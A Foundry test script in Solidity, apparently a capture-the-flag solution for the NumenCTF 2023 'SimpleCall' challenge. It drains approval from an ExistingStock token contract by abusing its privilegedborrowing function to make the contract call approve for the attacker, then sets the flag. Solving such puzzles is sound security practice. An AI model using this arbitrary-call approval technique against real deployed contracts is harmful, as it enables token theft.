// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;
pragma abicoder v2;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/NumenCTF_2023/SimpleCall/ExistingStock.sol";

contract Attacker is Test, Script {
    address deployer = makeAddr("deployer");
    uint256 attacker_key = vm.envUint("ATTACKER_KEY");
    address attacker = vm.addr(attacker_key);

    ExistingStock es;

    function setUp() public {
        vm.createSelectFork("mainnet");
        vm.startPrank(deployer, deployer);

        es = new ExistingStock();

        vm.stopPrank();
        console2.log("setUp done!");
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);

        solve();
        console.log("isSolved:", es.isSolved());
        vm.stopPrank();
    }

    function solve() public {
        es.transfer(address(es), 1);
        console2.log("Attacker balance:", es.balanceOf(attacker));

        es.privilegedborrowing(0, attacker, address(es), abi.encodeWithSignature("approve(address,uint256)", attacker, 2000000));
        es.setflag();
    }
}


